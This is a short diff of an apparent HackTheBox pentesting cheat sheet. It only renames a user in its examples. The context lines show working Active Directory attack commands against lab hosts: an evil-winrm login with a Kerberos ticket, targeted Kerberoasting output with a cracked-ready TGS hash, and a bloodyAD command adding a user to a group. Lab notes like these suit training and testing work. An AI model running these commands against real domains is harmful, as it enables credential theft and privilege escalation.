@@ -113,7 +113,7 @@ evil-winrm -i dc.domain.htb -k userticket.ccache -r REALM.htb  # with ticket aut
 [VERBOSE] SPN added successfully for (user2)
 [+] Printing hash for (user2)
 $krb5tgs$23$*user2$DOMAIN.HTB$machine.htb/User2*$0e83983aba480c3219b96987f20b128e$f66d93f0d55de1da3610267d601fe46a3eed827e3348ff764eca454ff3067429352018f988e71b0bca4636df36765f69664d77acdd4080b34d70ead2abbd2f52bb82054cd69f7f75475ee9beb93b06d036d6b24c8ace08ce04aac9cba49a6b8311fa66eb35ed80222cd23fc328ba489d2d9e83c47f9d0d1982b<SNIP>
-[VERBOSE] SPN removed successfully for (Alfred)
+[VERBOSE] SPN removed successfully for (user)
 ```
 
 ## BloodyAD
@@ -121,7 +121,7 @@ $krb5tgs$23$*user2$DOMAIN.HTB$machine.htb/User2*$0e83983aba480c3219b96987f20b128
 **AddSelf**
 ```bash
 ┌──(mdn0x㉿mdn0xKali)
-└─$ bloodyAD --host '10.10.11.xx' -d 'domain.htb' -u user -p 'passwd' add groupMember GROUP alfred
+└─$ bloodyAD --host '10.10.11.xx' -d 'domain.htb' -u user -p 'passwd' add groupMember GROUP user
 [+] user added to GROUP
 ```
 
